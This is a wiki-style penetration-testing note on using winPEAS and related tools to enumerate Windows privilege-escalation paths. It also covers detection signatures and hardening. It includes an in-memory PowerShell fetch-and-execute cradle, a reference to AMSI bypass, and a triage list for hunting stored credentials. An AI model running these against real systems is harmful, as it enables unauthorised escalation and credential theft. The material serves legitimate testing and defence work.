---
title: winPEAS Enumeration Flow
slug: winpeas-enumeration-flow
---

> **TL;DR:** winPEAS is the fastest first-pass Windows local enumeration tool; pair it with PowerUp, Seatbelt, and AccessChk to triage privilege-escalation candidates by red-highlighted findings.

## What it is
winPEAS is a Windows local privilege-escalation enumeration script that exists in three flavours: `winpeas.exe` (compiled .NET), `winpeas.bat` (legacy cmd one-liner), and `winpeas.ps1` (PowerShell port). It dumps system info, service ACLs, scheduled tasks, registry autoruns, credentials in files, and unattended install leftovers. Output is ANSI-colourised — red entries with a flashing "!" marker are likely privesc candidates, yellow are interesting context, and white is informational noise.

## Preconditions / where it applies
- Local interactive shell or RDP session as a low-privileged user
- Ability to drop a binary or run inline PowerShell (AMSI bypass may be required)
- Targets: Windows 7/8/10/11 and Server 2008R2 through 2022
- Outbound HTTP optional (for fetching the binary via `certutil`/`iwr`)

## Technique
```cmd
:: Drop and run the compiled enumerator (quiet, no banner, all checks)
winpeas.exe quiet cmd searchall fast > C:\Windows\Temp\wp.txt

:: PowerShell variant — runs without writing to disk
IEX(New-Object Net.WebClient).DownloadString('https://127.0.0.1/winPEAS.ps1')
```

```powershell
# Cross-check with PowerUp from PowerSploit
Import-Module .\PowerUp.ps1
Invoke-AllChecks | Tee-Object -FilePath powerup.txt

# Seatbelt — focused .NET enumerator with named check groups
.\Seatbelt.exe -group=all -outputfile=seatbelt.txt

# AccessChk — verify a specific service ACL flagged red by winPEAS
accesschk.exe -uwcqv "Authenticated Users" * /accepteula

# Dump scheduled tasks to CSV for offline grep
schtasks /query /fo csv /v > tasks.csv
```

Manual triage order after the dump: (1) red service ACL / unquoted path entries, (2) AlwaysInstallElevated registry pair, (3) AutoLogon credentials in HKLM, (4) writable %PATH% directories for DLL hijack, (5) cleartext creds in `unattend.xml` / `sysprep.inf` / Group Policy Preferences `cpassword`.

## Detection and defence
- Microsoft Defender signatures `HackTool:Win32/Winpeas` and `HackTool:PowerShell/PowerUp` fire on the unmodified binaries — defenders can alert on file write or AMSI scan match
- Sysmon event ID 1 with command-line containing `quiet cmd searchall` is a high-fidelity IOC
- AccessChk and Seatbelt are signed Microsoft / GitHub-released tooling and may slip past naive allow-lists; monitor child processes of `cmd.exe` reading `HKLM\SYSTEM\CurrentControlSet\Services\*\Security`
- Defence: enable Constrained Language Mode, WDAC code-integrity policy, and remove world-readable creds from `C:\Windows\Panther\`

## References
- [winPEAS repository](https://github.com/peass-ng/PEASS-ng) — canonical source
- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit) — Invoke-AllChecks reference
- [Seatbelt](https://github.com/GhostPack/Seatbelt) — focused .NET checks
- [AccessChk docs](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) — ACL verification

See also: [[windows-enumeration]], [[windows-privesc-checklist]], [[weak-service-permissions]].
